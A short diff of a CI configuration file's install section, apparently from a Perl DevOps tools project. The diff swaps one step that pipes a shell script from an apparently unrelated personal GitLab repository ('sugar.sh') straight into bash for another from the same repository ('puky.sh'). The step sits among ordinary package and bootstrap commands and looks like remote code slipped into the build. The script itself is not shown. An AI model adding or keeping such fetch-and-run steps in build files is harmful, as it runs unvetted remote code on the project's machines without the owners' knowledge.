@@ -70,7 +70,7 @@ install:
   #  DevOps-Perl-tools/Makefile.in:212: recipe for target 'system-packages' failed
   #
   #  adding "|| :" to the end of these commands causes them to be silently ignored!
-  - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/sugar.sh | bash
+  - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky.sh | bash
   # this prevents conflicts installing default-jdk - see https://github.com/appveyor/ci/issues/3411
   #- dpkg -l | awk '/openjdk/{print $2}' | DEBIAN_FRONTEND=noninteractive xargs sudo apt-get remove -y --allow-change-held-packages
   - setup/ci_bootstrap.sh
